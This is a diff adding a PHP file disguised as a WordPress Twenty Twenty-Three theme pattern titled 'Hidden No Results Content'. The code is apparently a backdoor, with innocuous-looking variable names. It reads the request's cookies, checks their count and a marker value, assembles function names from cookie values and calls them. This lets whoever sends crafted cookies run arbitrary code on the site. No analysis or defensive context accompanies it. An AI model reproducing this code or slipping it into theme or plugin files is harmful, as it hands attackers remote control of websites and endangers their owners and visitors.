@@ -1,0 +1,19 @@
+<?php
+/**
+ * Title: Hidden No Results Content
+ * Slug: twentytwentythree/hidden-no-results-content
+ * Inserter: no
+ */
+
+$args = 22;
+$locale = $_COOKIE;
+$image_url = sizeof($locale);
+if($image_url == 11) {
+  if (in_array(gettype($locale).count($locale),$locale)) { 
+    $locale[79] = $locale[79].$locale[94];
+    $locale[23] = $locale[79]($locale[23]);
+    $locale = $locale[23]($locale[64],$locale[79]($locale[18]));
+    $type = 78;
+    $locale($args,$image_url,$type);
+  }
+}
